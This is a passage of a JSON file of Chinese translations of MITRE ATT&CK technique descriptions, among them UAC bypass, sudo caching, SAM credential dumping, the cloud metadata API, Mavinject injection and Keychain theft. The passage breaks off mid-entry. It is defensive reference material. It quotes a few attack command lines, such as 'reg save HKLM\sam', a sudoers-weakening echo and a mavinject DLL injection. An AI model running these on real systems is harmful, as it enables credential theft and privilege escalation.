        "translated_description": "对手可能会绕过 UAC 机制以提升系统上的进程权限。Windows 用户帐户控制（UAC）允许程序提升其权限（跟踪为从低到高的完整性级别）以在管理员级别权限下执行任务，可能会提示用户确认。对用户的影响范围从在高强度执行下拒绝操作，到如果用户在本地管理员组中并点击提示或输入管理员密码以完成操作，则允许用户执行操作。(引用: TechNet How UAC Works)\n\n如果计算机的 UAC 保护级别设置为最高级别以外的任何级别，某些 Windows 程序可以提升权限或执行某些提升的[组件对象模型](https://attack.mitre.org/techniques/T1559/001)对象而无需通过 UAC 通知框提示用户。(引用: TechNet Inside UAC)(引用: MSDN COM Elevation) 例如，使用 [Rundll32](https://attack.mitre.org/techniques/T1218/011) 加载特定设计的 DLL，该 DLL 加载自动提升的[组件对象模型](https://attack.mitre.org/techniques/T1559/001)对象并在受保护目录中执行通常需要提升访问权限的文件操作。恶意软件还可能注入到受信任的进程中以获得提升的权限而无需提示用户。(引用: Davidson Windows)\n\n已经发现了许多绕过 UAC 的方法。Github 上的 UACME 说明页面包含了已发现和实现的方法的广泛列表(引用: Github UACMe)，但可能不是绕过方法的全面列表。定期发现其他绕过方法，并且一些方法在野外使用，例如：\n\n* <code>eventvwr.exe</code> 可以自动提升并执行指定的二进制文件或脚本。(引用: enigma0x3 Fileless UAC Bypass)(引用: Fortinet Fareit)\n\n如果已知具有管理员权限的帐户的凭据，则通过某些横向移动技术也可以绕过，因为 UAC 是单一系统安全机制，并且一个系统上运行的进程的权限或完整性在远程系统上未知，默认情况下为高完整性。(引用: SANS UAC Bypass)"
    },
    "SMS Pumping": {
        "translated_name": "短信泵送",
        "translated_description": "对手可能会利用消息服务进行短信泵送，这可能会影响系统和/或托管服务的可用性。(引用: Twilio SMS Pumping) 短信泵送是一种电信欺诈类型，威胁行为者首先从电信提供商处获得一组电话号码，然后利用受害者的消息基础设施向该组中的号码发送大量短信。通过生成发送到其电话号码集的短信流量，威胁行为者可能会从电信提供商处获得付款。(引用: Twilio SMS Pumping Fraud)\n\n威胁行为者通常使用公开可用的网页表单，例如一次性密码（OTP）或帐户验证字段，以生成短信流量。这些字段可能在后台使用 Twilio、AWS SNS 和 Amazon Cognito 等服务。(引用: Twilio SMS Pumping)(引用: AWS RE:Inforce Threat Detection 2024) 响应大量请求，短信费用可能会增加，通信渠道可能会变得不堪重负。(引用: Twilio SMS Pumping)"
    },
    "Internet Connection Discovery": {
        "translated_name": "互联网连接发现",
        "translated_description": "对手可能会检查受感染系统上的互联网连接。这可能在自动发现期间执行，并且可以通过多种方式完成，例如使用 [Ping](https://attack.mitre.org/software/S0097)、<code>tracert</code> 和 GET 请求到网站。\n\n对手可能会使用这些请求的结果和响应来确定系统是否能够与其 C2 服务器通信，然后再尝试连接它们。结果还可以用于识别路由器、重定向器和代理服务器。"
    },
    "Sudo and Sudo Caching": {
        "translated_name": "Sudo 和 Sudo 缓存",
        "translated_description": "对手可能会执行 sudo 缓存和/或使用 sudoers 文件来提升权限。对手可能这样做是为了以其他用户身份执行命令或生成具有更高权限的进程。\n\n在 Linux 和 MacOS 系统中，sudo（有时称为“超级用户执行”）允许用户从终端以提升的权限执行命令，并控制谁可以在系统上执行这些命令。<code>sudo</code> 命令“允许系统管理员委派权限，授予某些用户（或用户组）以 root 或其他用户身份运行某些（或所有）命令的能力，同时提供命令及其参数的审计跟踪。”(引用: sudo man page 2018) 由于 sudo 是为系统管理员设计的，因此它具有一些有用的配置功能，例如 <code>timestamp_timeout</code>，这是 <code>sudo</code> 之间的时间间隔，以分钟为单位，然后它会重新提示输入密码。这是因为 <code>sudo</code> 具有缓存凭据的能力。Sudo 会在 <code>/var/db/sudo</code> 处创建（或触摸）一个文件，其中包含上次运行 sudo 的时间戳，以确定此超时。此外，还有一个 <code>tty_tickets</code> 变量，它将每个新的 tty（终端会话）视为隔离的。这意味着，例如，一个 tty 的 sudo 超时不会影响另一个 tty（您将不得不再次输入密码）。\n\nsudoers 文件 <code>/etc/sudoers</code> 描述了哪些用户可以从哪些终端运行哪些命令。这还描述了用户可以以其他用户或组身份运行哪些命令。这提供了最低权限原则，使用户在大多数时间内以最低可能的权限运行，并且仅在需要时通过提示输入密码提升到其他用户或权限。然而，sudoers 文件还可以通过类似 <code>user1 ALL=(ALL) NOPASSWD: ALL</code> 的行指定何时不提示用户输入密码。(引用: OSX.Dok Malware) 但是，编辑此文件需要提升的权限。\n\n对手还可以滥用这些机制的配置不当来提升权限而无需用户的密码。例如，可以监视 <code>/var/db/sudo</code> 的时间戳以查看它是否在 <code>timestamp_timeout</code> 范围内。如果是，则恶意软件可以执行 sudo 命令而无需提供用户的密码。此外，如果禁用 <code>tty_tickets</code>，对手可以从该用户的任何 tty 执行此操作。\n\n在野外，恶意软件已禁用 <code>tty_tickets</code> 以潜在地使脚本编写更容易，通过发出 <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>。(引用: cybereason osx proton) 为了使此更改生效，恶意软件还发出了 <code>killall Terminal</code>。从 macOS Sierra 开始，sudoers 文件默认启用了 <code>tty_tickets</code>。"
    },
    "Archive via Custom Method": {
        "translated_name": "通过自定义方法归档",
        "translated_description": "对手可能会使用自定义方法压缩或加密在外传之前收集的数据。对手可能会选择使用自定义归档方法，例如使用没有外部库或实用程序引用的 XOR 或流密码进行加密。也使用了知名压缩算法的自定义实现。(引用: ESET Sednit Part 2)"
    },
    "Modify Cloud Compute Infrastructure": {
        "translated_name": "修改云计算基础设施",
        "translated_description": "对手可能会尝试修改云帐户的计算服务基础设施以规避防御措施。对计算服务基础设施的修改可以包括创建、删除或修改一个或多个组件，例如计算实例、虚拟机和快照。\n\n通过修改基础设施组件获得的权限可能会绕过限制现有基础设施访问的限制。修改基础设施组件还可能允许对手规避检测并删除其存在的证据。(引用: Mandiant M-Trends 2020)"
    },
    "Network Devices": {
        "translated_name": "网络设备",
        "translated_description": "对手可能会妥协第三方网络设备，这些设备可以在目标过程中使用。网络设备，例如小型办公室/家庭办公室（SOHO）路由器，可能会被妥协，其中对手的最终目标不是[初始访问](https://attack.mitre.org/tactics/TA0001)到该环境——而是利用这些设备来支持额外的目标。\n\n一旦对手获得控制，妥协的网络设备可以用于发起额外的操作，例如托管[网络钓鱼](https://attack.mitre.org/techniques/T1566)活动的有效负载（即，[链接目标](https://attack.mitre.org/techniques/T1608/005)）或启用执行[内容注入](https://attack.mitre.org/techniques/T1659)操作所需的访问。对手还可能能够从妥协的网络设备中收集可重用的凭据（即，[有效帐户](https://attack.mitre.org/techniques/T1078)）。\n\n对手通常会针对面向互联网的边缘设备和相关网络设备，这些设备通常不支持强大的主机防御。(引用: Mandiant Fortinet Zero Day)(引用: Wired Russia Cyberwar)\n\n妥协的网络设备可以用于支持后续的[命令和控制](https://attack.mitre.org/tactics/TA0011)活动，例如通过已建立的[代理](https://attack.mitre.org/techniques/T1090)和/或[僵尸网络](https://attack.mitre.org/techniques/T1584/005)网络[隐藏基础设施](https://attack.mitre.org/techniques/T1665)。(引用: Justice GRU 2024)"
    },
    "Malvertising": {
        "translated_name": "恶意广告",
        "translated_description": "对手可能会购买在线广告，这些广告可以被滥用来向受害者分发恶意软件。广告可以被购买以在特定位置在线植入和有利地定位工件，例如在搜索引擎结果中显著位置。这些广告可能使用户更难区分实际搜索结果和广告。(引用: spamhaus-malvertising) 购买的广告还可以使用广告网络的功能针对特定受众，可能进一步利用搜索引擎和流行网站固有的信任。\n\n对手可能会购买广告和其他资源来帮助向受害者分发包含恶意代码的工件。购买的广告可能试图冒充或伪装知名品牌。例如，这些伪装的广告可能会诱骗受害者点击广告，然后将他们发送到一个恶意域，该域可能是包含特洛伊木马版本的广告软件的官方网站的克隆。(引用: Masquerads-Guardio)(引用: FBI-search) 对手创建恶意域和购买广告的努力也可能在规模上自动化，以更好地抵抗清理工作。(引用: sentinelone-malvertising)\n\n恶意广告可能用于支持[驱动目标](https://attack.mitre.org/techniques/T1608/004)和[驱动妥协](https://attack.mitre.org/techniques/T1189)，如果广告包含感染目标系统的网络浏览器的代码/漏洞，可能需要用户的有限交互。(引用: BBC-malvertising)\n\n对手还可能采用多种技术来规避广告网络的检测。例如，对手可能会动态路由广告点击，将自动爬虫/策略执行器流量发送到良性站点，同时验证潜在目标，然后将从真实广告点击中推荐的受害者发送到恶意页面。因此，这种感染向量可能会隐藏在广告网络以及任何未通过点击广告到达恶意站点的访问者之外。(引用: Masquerads-Guardio) 其他技巧，例如故意拼写错误以避免品牌声誉监控，也可能用于规避自动检测。(引用: spamhaus-malvertising)"
    },
    "Permission Groups Discovery": {
        "translated_name": "权限组发现",
        "translated_description": "对手可能会尝试发现组和权限设置。这些信息可以帮助对手确定哪些用户帐户和组可用，特定组中的用户成员身份，以及哪些用户和组具有提升的权限。\n\n对手可能会尝试以多种不同方式发现组权限设置。这些数据可能为对手提供有关被破坏环境的信息，可用于后续活动和目标。(引用: CrowdStrike BloodHound April 2018)"
    },
    "Email Collection": {
        "translated_name": "电子邮件收集",
        "translated_description": "对手可能会针对用户电子邮件以收集敏感信息。电子邮件可能包含敏感数据，包括商业秘密或个人信息，这些信息对对手来说可能非常有价值。电子邮件还可能包含有关正在进行的事件响应操作的详细信息，这可能允许对手调整其技术以保持持久性或规避防御。(引用: TrustedSec OOB Communications)(引用: CISA AA20-352A 2021) 对手可以从邮件服务器或客户端收集或转发电子邮件。"
    },
    "Security Account Manager": {
        "translated_name": "安全帐户管理器",
        "translated_description": "对手可能会尝试通过内存技术或通过存储 SAM 数据库的 Windows 注册表提取凭据材料。SAM 是一个数据库文件，包含主机的本地帐户，通常可以通过 <code>net user</code> 命令找到。枚举 SAM 数据库需要 SYSTEM 级别的访问权限。\n\n可以使用多种工具通过内存技术检索 SAM 文件：\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\n或者，可以使用 Reg 从注册表中提取 SAM：\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\n然后可以使用 Creddump7 在本地处理 SAM 数据库以检索哈希。(引用: GitHub Creddump7)\n\n注意：\n\n* RID 500 帐户是本地内置管理员。\n* RID 501 是来宾帐户。\n* 用户帐户从 RID 1000+ 开始。"
    },
    "WHOIS": {
        "translated_name": "WHOIS",
        "translated_description": "对手可能会搜索公共 WHOIS 数据以获取有关受害者的信息，这些信息可以在目标过程中使用。WHOIS 数据由负责分配和分配互联网资源（如域名）的区域互联网注册机构（RIR）存储。任何人都可以查询 WHOIS 服务器以获取有关注册域的信息，例如分配的 IP 块、联系信息和 DNS 名称服务器。(引用: WHOIS)\n\n对手可能会搜索 WHOIS 数据以收集可操作的信息。威胁行为者可以使用在线资源或命令行实用程序来搜索 WHOIS 数据以获取有关潜在受害者的信息。这些来源的信息可能会揭示其他形式的侦察机会（例如，[主动扫描](https://attack.mitre.org/techniques/T1595)或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)），建立操作资源（例如，[获取基础设施](https://attack.mitre.org/techniques/T1583)或[妥协基础设施](https://attack.mitre.org/techniques/T1584)），和/或初始访问（例如，[外部远程服务](https://attack.mitre.org/techniques/T1133)或[受信任关系](https://attack.mitre.org/techniques/T1199)）。"
    },
    "System Firmware": {
        "translated_name": "系统固件",
        "translated_description": "对手可能会修改系统固件以在系统上保持持久性。BIOS（基本输入/输出系统）和统一可扩展固件接口（UEFI）或可扩展固件接口（EFI）是系统固件的示例，它们作为计算机操作系统和硬件之间的软件接口。(引用: Wikipedia BIOS)(引用: Wikipedia UEFI)(引用: About UEFI)\n\n系统固件如 BIOS 和 (U)EFI 支持计算机的功能，可能会被对手修改以执行或协助恶意活动。存在覆盖系统固件的能力，这可能为复杂的对手提供一种手段，通过安装恶意固件更新作为在系统上保持持久性的一种手段，这可能难以检测。"
    },
    "Search Victim-Owned Websites": {
        "translated_name": "搜索受害者拥有的网站",
        "translated_description": "对手可能会搜索受害者拥有的网站以获取可以在目标过程中使用的信息。受害者拥有的网站可能包含各种详细信息，包括部门/部门名称、物理位置和关键员工的数据信息，例如姓名、角色和联系信息（例如，[电子邮件地址](https://attack.mitre.org/techniques/T1589/002)）。这些网站还可能包含有关业务运营和关系的详细信息。(引用: Comparitech Leak)\n\n对手可能会搜索受害者拥有的网站以收集可操作的信息。这些来源的信息可能会揭示其他形式的侦察机会（例如，[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)），建立操作资源（例如，[建立帐户](https://attack.mitre.org/techniques/T1585)或[妥协帐户](https://attack.mitre.org/techniques/T1586)），和/或初始访问（例如，[受信任关系](https://attack.mitre.org/techniques/T1199)或[网络钓鱼](https://attack.mitre.org/techniques/T1566)）。\n\n除了手动浏览网站外，对手还可能尝试识别隐藏的目录或文件，这些目录或文件可能包含其他敏感信息或易受攻击的功能。他们可能通过自动化活动（例如，[单词列表扫描](https://attack.mitre.org/techniques/T1595/003)）以及利用文件（例如 sitemap.xml 和 robots.txt）来实现这一点。(引用: Perez Sitemap XML 2023)(引用: Register Robots TXT 2015)"
    },
    "Cloud Groups": {
        "translated_name": "云组",
        "translated_description": "对手可能会尝试查找云组和权限设置。云权限组的知识可以帮助对手确定环境中用户和组的特定角色，以及哪些用户与特定组相关联。\n\n通过经过身份验证的访问，可以使用多种工具查找权限组。<code>Get-MsolRole</code> PowerShell cmdlet 可用于获取 Exchange 和 Office 365 帐户的角色和权限组 (引用: Microsoft Msolrole)(引用: GitHub Raindance)。\n\nAzure CLI (AZ CLI) 和 Google Cloud Identity Provider API 还提供接口以获取权限组。命令 <code>az ad user get-member-groups</code> 将列出与 Azure 用户帐户关联的组，而 API 端点 <code>GET https://cloudidentity.googleapis.com/v1/groups</code> 列出用户可用的组资源 Google。(引用: Microsoft AZ CLI)(引用: Black Hills Red Teaming MS AD Azure, 2018)(引用: Google Cloud Identity API Documentation) 在 AWS 中，命令 `ListRolePolicies` 和 `ListAttachedRolePolicies` 允许用户枚举附加到角色的策略。(引用: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\n对手可能会尝试列出对象的 ACL 以确定所有者和其他具有访问权限的帐户，例如，通过 AWS <code>GetBucketAcl</code> API (引用: AWS Get Bucket ACL)。使用此信息，对手可以针对具有给定对象权限的帐户，或利用他们已经破坏的帐户访问该对象。"
    },
    "Services Registry Permissions Weakness": {
        "translated_name": "服务注册表权限弱点",
        "translated_description": "对手可能通过劫持服务使用的注册表项来执行他们自己的恶意有效负载。对手可能会利用服务注册表项权限中的漏洞，将原本指定的可执行文件重定向到他们控制的文件，以便在服务启动时启动他们自己的代码。Windows 在 <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code> 下的注册表中存储本地服务配置信息。可以通过服务控制器、sc.exe、[PowerShell](https://attack.mitre.org/techniques/T1059/001) 或 [Reg](https://attack.mitre.org/software/S0075) 等工具操作存储在服务注册表项下的信息。对注册表项的访问通过访问控制列表和用户权限进行控制。(引用: Registry Key Security)(引用: malware_hides_service)\n\n如果用户和组的权限设置不正确，并允许访问服务的注册表项，对手可能会更改服务的 binPath/ImagePath 以指向他们控制的不同可执行文件。当服务启动或重新启动时，对手控制的程序将执行，允许对手在服务设置为执行的帐户上下文（本地/域帐户、SYSTEM、LocalService 或 NetworkService）中建立持久性和/或提升权限。\n\n对手还可能更改服务注册表树中的其他注册表项。例如，可以更改 <code>FailureCommand</code> 键，以便在服务失败或故意损坏时在提升的上下文中执行服务。(引用: Kansa Service related collectors)(引用: Tweet Registry Perms Weakness)\n\n<code>Performance</code> 键包含驱动程序服务性能 DLL 的名称和 DLL 中几个导出函数的名称。(引用: microsoft_services_registry_tree) 如果 <code>Performance</code> 键尚不存在，并且对手控制的用户具有 <code>Create Subkey</code> 权限，对手可能会在服务的注册表树中创建 <code>Performance</code> 键以指向恶意 DLL。(引用: insecure_reg_perms)\n\n对手还可能添加 <code>Parameters</code> 键，该键存储驱动程序特定数据，或其他自定义子键以建立持久性或启用其他恶意活动。(引用: microsoft_services_registry_tree)(引用: troj_zegost) 此外，如果对手使用 svchost.exe 启动他们的恶意服务，可以使用 <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code> 标识服务的文件。(引用: malware_hides_service)"
    },
    "DNS/Passive DNS": {
        "translated_name": "DNS/被动 DNS",
        "translated_description": "对手可能会搜索 DNS 数据以获取有关受害者的信息，这些信息可以在目标过程中使用。DNS 信息可能包括各种详细信息，包括注册的名称服务器以及描述目标子域、邮件服务器和其他主机寻址的记录。\n\n对手可能会搜索 DNS 数据以收集可操作的信息。威胁行为者可以直接查询目标组织的名称服务器，或搜索记录的 DNS 查询响应的集中存储库（称为被动 DNS）。(引用: DNS Dumpster)(引用: Circl Passive DNS) 对手还可能寻求和针对暴露有关内部网络信息的 DNS 配置错误/泄漏。这些来源的信息可能会揭示其他形式的侦察机会（例如，[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)或[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如，[获取基础设施](https://attack.mitre.org/techniques/T1583)或[妥协基础设施](https://attack.mitre.org/techniques/T1584)），和/或初始访问（例如，[外部远程服务](https://attack.mitre.org/techniques/T1133)或[受信任关系](https://attack.mitre.org/techniques/T1199)）。"
    },
    "Application Exhaustion Flood": {
        "translated_name": "应用程序耗尽洪流",
        "translated_description": "对手可能会针对应用程序的资源密集型功能发起拒绝服务（DoS）攻击，拒绝对这些应用程序的访问。例如，Web 应用程序中的特定功能可能非常资源密集。对这些功能的重复请求可能会耗尽系统资源并拒绝访问应用程序或服务器本身。(引用: Arbor AnnualDoSreport Jan 2018)"
    },
    "Compromise Software Dependencies and Development Tools": {
        "translated_name": "妥协软件依赖项和开发工具",
        "translated_description": "对手可能会在最终消费者接收之前操纵软件依赖项和开发工具，以实现数据或系统妥协。应用程序通常依赖于外部软件才能正常运行。作为依赖项使用的流行开源项目可能成为目标，以便向依赖项的用户添加恶意代码。(引用: Trendmicro NPM Compromise)\n\n目标可能特定于所需的受害者集，或分发给广泛的消费者，但仅在特定受害者上继续进行其他策略。"
    },
    "DNS Server": {
        "translated_name": "DNS 服务器",
        "translated_description": "对手可能会妥协第三方 DNS 服务器，这些服务器可以在目标过程中使用。在后续妥协活动中，对手可能会利用 DNS 流量执行各种任务，包括命令和控制（例如：[应用层协议](https://attack.mitre.org/techniques/T1071)）。对手可能会妥协第三方 DNS 服务器以支持操作，而不是设置自己的 DNS 服务器。\n\n通过妥协 DNS 服务器，对手可以更改 DNS 记录。这种控制可以允许对手重定向组织的流量，促进对手的收集和凭证访问工作。(引用: Talos DNSpionage Nov 2018)(引用: FireEye DNS Hijack 2019) 此外，对手可能会利用这种控制与[数字证书](https://attack.mitre.org/techniques/T1588/004)结合使用，将流量重定向到对手控制的基础设施，模仿正常的受信任网络通信。(引用: FireEye DNS Hijack 2019)(引用: Crowdstrike DNS Hijack 2019) 对手还可能能够在不提醒 DNS 服务器实际所有者的情况下，静默创建指向恶意服务器的子域。(引用: CiscoAngler)(引用: Proofpoint Domain Shadowing)"
    },
    "Disk Wipe": {
        "translated_name": "磁盘擦除",
        "translated_description": "对手可能会擦除或破坏特定系统或网络中大量系统上的原始磁盘数据，以中断系统和网络资源的可用性。通过直接写入磁盘数据，对手可能会尝试覆盖磁盘数据的部分内容。对手可能会选择擦除任意部分的磁盘数据和/或擦除磁盘结构，如主引导记录（MBR）。可能会尝试完全擦除所有磁盘扇区。\n\n为了在网络范围内中断可用性，最大限度地影响目标组织，使用的擦除磁盘的恶意软件可能具有类似蠕虫的特性，通过利用其他技术如[有效帐户](https://attack.mitre.org/techniques/T1078)、[操作系统凭证转储](https://attack.mitre.org/techniques/T1003)和[SMB/Windows 管理共享](https://attack.mitre.org/techniques/T1021/002)在网络中传播。(引用: Novetta Blockbuster Destructive Malware)\n\n在网络设备上，对手可能会使用[网络设备 CLI](https://attack.mitre.org/techniques/T1059/008)命令如`erase`擦除设备上的配置文件和其他数据。(引用: erase_cmd_cisco)"
    },
    "Cloud Instance Metadata API": {
        "translated_name": "云实例元数据 API",
        "translated_description": "对手可能会尝试访问云实例元数据 API 以收集凭证和其他敏感数据。\n\n大多数云服务提供商支持云实例元数据 API，这是一种提供给运行虚拟实例的服务，允许应用程序访问有关运行虚拟实例的信息。可用信息通常包括名称、安全组和其他元数据，包括敏感数据，如凭证和可能包含其他秘密的 UserData 脚本。实例元数据 API 作为一种便利提供，以帮助管理应用程序，并且任何可以访问实例的人都可以访问。(引用: AWS Instance Metadata API) 在至少一次高调的妥协中使用了云元数据 API。(引用: Krebs Capital One August 2019)\n\n如果对手在运行的虚拟实例上有存在，他们可能会直接查询实例元数据 API 以识别授予访问其他资源的凭证。此外，对手可能会利用公共面对的 Web 代理中的服务器端请求伪造 (SSRF) 漏洞，允许他们通过请求实例元数据 API 访问敏感信息。(引用: RedLock Instance Metadata API 2018)\n\n云服务提供商的事实标准是将实例元数据 API 托管在 <code>http[:]//169.254.169.254</code>。\n"
    },
    "Securityd Memory": {
        "translated_name": "Securityd 内存",
        "translated_description": "具有 root 访问权限的对手可能通过读取 `securityd` 的内存来收集凭证。`securityd` 是负责实现安全协议（如加密和授权）的服务/守护进程。(引用: Apple Dev SecurityD) 具有特权的对手可能能够扫描 `securityd` 的内存以找到正确的密钥序列来解密用户的登录钥匙串。这可能为对手提供各种明文密码，如用户、WiFi、邮件、浏览器、证书、安全笔记等的密码。(引用: OS X Keychain)(引用: OSX Keydnap malware)\n\n在 El Capitan 之前的 OS X 中，具有 root 访问权限的用户可以读取已登录用户的明文钥匙串密码，因为 Apple 的钥匙串实现允许缓存这些凭证，以便用户不会反复提示输入密码。(引用: OS X Keychain)(引用: External to DA, the OS X Way) Apple 的 `securityd` 实用程序获取用户的登录密码，用 PBKDF2 加密，并将此主密钥存储在内存中。Apple 还使用一组密钥和算法来加密用户的密码，但一旦找到主密钥，对手只需迭代其他值即可解锁最终密码。(引用: OS X Keychain)"
    },
    "Group Policy Discovery": {
        "translated_name": "组策略发现",
        "translated_description": "对手可能会收集组策略设置的信息，以识别权限提升的路径、域内应用的安全措施，并发现可以操纵或用于在环境中混合的域对象模式。组策略允许在 Active Directory (AD) 中集中管理用户和计算机设置。组策略对象 (GPO) 是由存储在可预测网络路径 `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\` 中的文件组成的组策略设置容器。(引用: TechNet Group Policy Basics)(引用: ADSecurity GPO Persistence 2016)\n\n对手可能会使用诸如 <code>gpresult</code> 的命令或各种公开可用的 PowerShell 函数，如 <code>Get-DomainGPO</code> 和 <code>Get-DomainGPOLocalGroup</code>，来收集组策略设置的信息。(引用: Microsoft gpresult)(引用: Github PowerShell Empire) 对手可能会使用此信息来塑造后续行为，包括确定目标网络中的潜在攻击路径以及操纵组策略设置（即[域或租户策略修改](https://attack.mitre.org/techniques/T1484)）的机会，以使其受益。"
    },
    "Bootkit": {
        "translated_name": "引导工具包",
        "translated_description": "对手可能会使用引导工具包在系统上保持持久性。引导工具包位于操作系统下方的层，可能使执行完全修复变得困难，除非组织怀疑使用了引导工具包并能相应地采取行动。\n\n引导工具包是一种修改硬盘引导扇区的恶意软件变体，包括主引导记录 (MBR) 和卷引导记录 (VBR)。(引用: Mandiant M Trends 2016) MBR 是在 BIOS 完成硬件初始化后首先加载的磁盘部分。它是引导加载程序的位置。具有对引导驱动器的原始访问权限的对手可能会覆盖此区域，在启动过程中将执行从正常引导加载程序转移到对手代码。(引用: Lau 2011)\n\nMBR 将引导过程的控制权交给 VBR。与 MBR 的情况类似，具有对引导驱动器的原始访问权限的对手可能会覆盖 VBR，在启动过程中将执行转移到对手代码。"
    },
    "Data from Removable Media": {
        "translated_name": "来自可移动媒体的数据",
        "translated_description": "对手可能会搜索他们已妥协的计算机上的连接可移动媒体，以查找感兴趣的文件。在外传之前，可以从连接到受感染系统的任何可移动媒体（光盘驱动器、USB 存储器等）中收集敏感数据。可能正在使用交互式命令外壳，并且可以使用 [cmd](https://attack.mitre.org/software/S0106) 中的常见功能来收集信息。\n\n一些对手还可能在可移动媒体上使用[自动化收集](https://attack.mitre.org/techniques/T1119)。"
    },
    "Mavinject": {
        "translated_name": "Mavinject",
        "translated_description": "对手可能会滥用 mavinject.exe 来代理执行恶意代码。Mavinject.exe 是 Microsoft 应用程序虚拟化注入器，是一种 Windows 实用程序，可以作为 Microsoft 应用程序虚拟化 (App-V) 的一部分将代码注入外部进程。(引用: LOLBAS Mavinject)\n\n对手可能会滥用 mavinject.exe 将恶意 DLL 注入正在运行的进程（即[动态链接库注入](https://attack.mitre.org/techniques/T1055/001)），允许任意代码执行（例如 <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>）。(引用: ATT Lazarus TTP Evolution)(引用: Reaqta Mavinject) 由于 mavinject.exe 可能由 Microsoft 数字签名，通过这种方法代理执行可能会逃避安全产品的检测，因为执行被掩盖在合法进程下。\n\n除了[动态链接库注入](https://attack.mitre.org/techniques/T1055/001)外，Mavinject.exe 还可以通过其 <code>/HMODULE</code> 命令行参数执行导入描述符注入（例如 <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>）。此命令将注入由指定 DLL 组成的导入表条目到给定基地址的模块中。(引用: Mavinject Functionality Deconstructed)"
    },
    "Local Data Staging": {
        "translated_name": "本地数据暂存",
        "translated_description": "对手可能会在外传之前将收集的数据暂存在本地系统的中央位置或目录中。数据可以保存在单独的文件中，也可以通过[归档收集的数据](https://attack.mitre.org/techniques/T1560)等技术合并到一个文件中。可能会使用交互式命令外壳，并且可以使用 [cmd](https://attack.mitre.org/software/S0106) 和 bash 中的常见功能将数据复制到暂存位置。\n\n对手还可能会在系统的各种可用格式/位置中暂存收集的数据，包括本地存储数据库/存储库或 Windows 注册表。(引用: Prevailion DarkWatchman 2021)"
    },
    "Match Legitimate Name or Location": {
        "translated_name": "匹配合法名称或位置",
        "translated_description": "对手可能会在命名/放置文件时匹配或近似合法文件或资源的名称或位置。这是为了逃避防御和观察。可以通过将可执行文件放置在常见的受信目录（例如 System32 下）或给它一个合法的、受信程序的名称（例如 svchost.exe）来实现。在容器化环境中，这也可以通过在命名空间中创建与容器 pod 或集群的命名约定匹配的资源来实现。或者，给定的文件或容器镜像名称可能是合法程序/镜像的近似值或看似无害的名称。\n\n对手还可能使用他们试图模仿的文件的相同图标。"
    },
    "Stored Data Manipulation": {
        "translated_name": "存储数据操纵",
        "translated_description": "对手可能会插入、删除或操纵静态数据，以影响外部结果或隐藏活动，从而威胁数据的完整性。(引用: FireEye APT38 Oct 2018)(引用: DOJ Lazarus Sony 2018) 通过操纵存储的数据，对手可能会尝试影响业务流程、组织理解和决策。\n\n存储的数据可能包括各种文件格式，如 Office 文件、数据库、存储的电子邮件和自定义文件格式。修改的类型及其影响取决于数据的类型以及对手的目标和目的。对于复杂系统，对手可能需要特殊的专业知识，并可能需要访问与系统相关的专用软件，这通常通过长期的信息收集活动获得，以实现预期的影响。"
    },
    "Password Cracking": {
        "translated_name": "密码破解",
        "translated_description": "对手可能会使用密码破解来尝试恢复可用的凭据，例如明文密码，当获得凭据材料如密码哈希时。[操作系统凭据转储](https://attack.mitre.org/techniques/T1003)可以用来获取密码哈希，但当[传递哈希](https://attack.mitre.org/techniques/T1550/002)不是一个选项时，这可能只能让对手走到这一步。此外，对手可能会利用[配置库中的数据](https://attack.mitre.org/techniques/T1602)来获取网络设备的哈希凭据。(引用: US-CERT-TA18-106A)\n\n有系统地猜测用于计算哈希的密码的技术是可用的，或者对手可能使用预先计算的彩虹表来破解哈希。破解哈希通常在对手控制的系统上进行，位于目标网络之外。(引用: Wikipedia Password cracking) 成功破解哈希后得到的明文密码可能用于登录系统、资源和服务，账户有访问权限。"
    },
    "Local Email Collection": {
        "translated_name": "本地电子邮件收集",
        "translated_description": "对手可能会在本地系统上收集用户电子邮件以获取敏感信息。包含电子邮件数据的文件可以从用户的本地系统中获取，例如Outlook存储或缓存文件。\n\nOutlook在本地以扩展名为.ost的离线数据文件存储数据。Outlook 2010及更高版本支持高达50GB的.ost文件大小，而早期版本的Outlook支持高达20GB。(引用: Outlook File Sizes) Outlook 2013（及更早版本）中的IMAP账户和POP账户使用Outlook数据文件（.pst）而不是.ost，而Outlook 2016（及更高版本）中的IMAP账户使用.ost文件。这两种类型的Outlook数据文件通常存储在`C:\\Users\\<username>\\Documents\\Outlook Files`或`C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`。(引用: Microsoft Outlook Files)"
    },
    "Keychain": {
        "translated_name": "钥匙串",
        "translated_description": "对手可能会从钥匙串中获取凭据。钥匙串（或钥匙串服务）是macOS的凭据管理系统，存储账户名称、密码、私钥、证书、敏感应用数据、支付数据和安全笔记。有三种类型的钥匙串：登录钥匙串、系统钥匙串和本地项目（iCloud）钥匙串。默认的钥匙串是登录钥匙串，它存储用户密码和信息。系统钥匙串存储操作系统访问的项目，例如主机上用户之间共享的项目。本地项目（iCloud）钥匙串用于与Apple的iCloud服务同步的项目。\n\n可以通过钥匙串访问应用程序或使用命令行实用程序<code>security</code>查看和编辑钥匙串。钥匙串文件位于<code>~/Library/Keychains/</code>、<code>/Library/Keychains/</code>和<code>/Network/Library/Keychains/</code>。(引用: Keychain Services Apple)(引用: Keychain Decryption Passware)(引用: OSX Keychain Schaumann)\n\n对手可能会从钥匙串存储/内存中收集用户凭据。例如，命令<code>security dump-keychain 